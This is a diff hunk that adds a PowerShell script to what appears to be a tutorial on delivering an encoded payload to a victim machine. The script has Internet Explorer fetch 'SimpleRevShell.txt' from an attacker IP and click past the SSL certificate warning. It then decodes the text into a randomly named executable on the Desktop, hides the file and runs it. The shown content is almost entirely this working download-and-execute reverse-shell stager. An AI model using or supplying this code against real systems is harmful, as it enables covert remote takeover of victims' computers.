@@ -146,7 +146,52 @@ Now we start the web server waiting for incoming request for the encoded payload
 ```
 On the client\victim machine we have the following Powershell script:
 ```
+"Starting Internet Explorer..."
 
+$ie = New-Object -com InternetExplorer.Application
+#true to debug 
+$ie.visible=$true
+#set the attacker IP###
+$ip = '192.168.1.7'
+#######################
+$uri = "https://$ip/SimpleRevShell.txt"
+$ie.navigate("$uri")
+#wait until the page is ready
+while($ie.ReadyState -ne 4) {start-sleep -m 100};
+#Certification exception
+if ($ie.document.url -Match "invalidcert")
+{
+    "Bypassing SSL certificate error...";
+    #get the link
+    $sslbypass= $ie.Document.getElementsByTagName("a") | where-object {$_.id -eq "overridelink"};
+    #simulate the click
+    $sslbypass.click();
+    "Wait 5 seconds while page loads...";
+    start-sleep -s 5;
+};
+
+#check if we reachead the server
+if ($ie.Document.domain -Match $ip){ 
+    
+    "Successfully bypassed SSL error";
+    $text = $ie.Document.Body.InnerText;
+    $Desktop = [Environment]::GetFolderPath("Desktop");
+    #random file name
+    $rndFile = -join ((0x30..0x39) + ( 0x41..0x5A) + ( 0x61..0x7A) | Get-Random -Count 6  | % {[char]$_})
+    #full payload path
+    $FileRes = "$Desktop\$rndFile.exe";
+	[IO.File]::WriteAllBytes($FileRes, [Convert]::FromBase64String($text));
+    "Successfully extracted the content document in $FileRes";
+    # Hide the file
+    Set-ItemProperty -Path $FileRes -Name attributes  -Value ([io.fileattributes]::Hidden)
+    "File is now hidden, trying to run the payload in 3 seconds..."
+    start-sleep -s 3;
+	#finally execute it
+    & $FileRes
+
+}
+else{"An error occured";}
+get-process iexplore | stop-process
 ```
 
 
